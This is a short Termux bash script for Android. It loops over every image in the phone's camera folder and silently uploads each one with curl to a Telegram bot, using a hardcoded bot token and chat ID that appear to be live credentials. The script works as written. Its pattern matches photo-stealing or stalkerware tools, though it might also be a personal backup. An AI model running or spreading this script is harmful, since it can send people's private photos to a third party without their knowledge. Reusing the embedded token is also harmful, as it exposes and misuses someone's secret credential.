#!/data/data/com.termux/files/usr/bin/bash

# Telegram bot credentials
BOT_TOKEN="7400095855:AAE9Lqtz6LLM-_gEasvVWY4nqGtkxr2I-rY"
CHAT_ID="6565158025"
API_URL="https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"

# Camera folder path
CAMERA_DIR="/data/data/com.termux/files/home/storage/shared/DCIM/Camera"

# Go to the camera directory
cd "$CAMERA_DIR" || exit

# Loop through image files
for image in *.jpg *.jpeg *.png; do
    if [ -f "$image" ]; then
        curl -s -X POST "$API_URL" \
            -F chat_id="$CHAT_ID" \
            -F photo=@"$image"
    fi
done
